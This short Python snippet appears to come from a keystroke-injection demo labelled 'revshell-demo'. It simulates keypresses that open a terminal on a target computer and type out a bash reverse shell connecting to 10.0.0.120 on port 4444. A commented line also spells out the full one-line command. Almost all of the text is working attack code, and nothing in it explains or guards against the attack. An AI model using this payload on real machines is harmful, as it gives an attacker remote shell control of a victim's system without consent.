...
adapter.set_name("revshell-demo")
...
log.status("opening terminal and setting up a reverse shell")
try:
    #Open terminal
    client.send_keypress(Key.LeftControl, Key.LeftAlt, Key.T, Mod.LeftControl, Mod.LeftAlt)
    time.sleep(5)
    client.send_ascii("bash -i ")
    client.send_keypress(Key.Dot, Key.LeftShift, Mod.LeftShift)
    client.send_keypress(Key._7, Key.LeftShift, Mod.LeftShift)
    client.send_ascii(" /dev/tcp/10.0.0.120/4444 0")
    client.send_keypress(Key.Dot, Key.LeftShift, Mod.LeftShift)
    client.send_keypress(Key._7, Key.LeftShift, Mod.LeftShift)
    client.send_keypress(Key._1)
    #client.send_ascii("bash -i >& /dev/tcp/10.0.0.120/4444 0>&1")
    time.sleep(1)
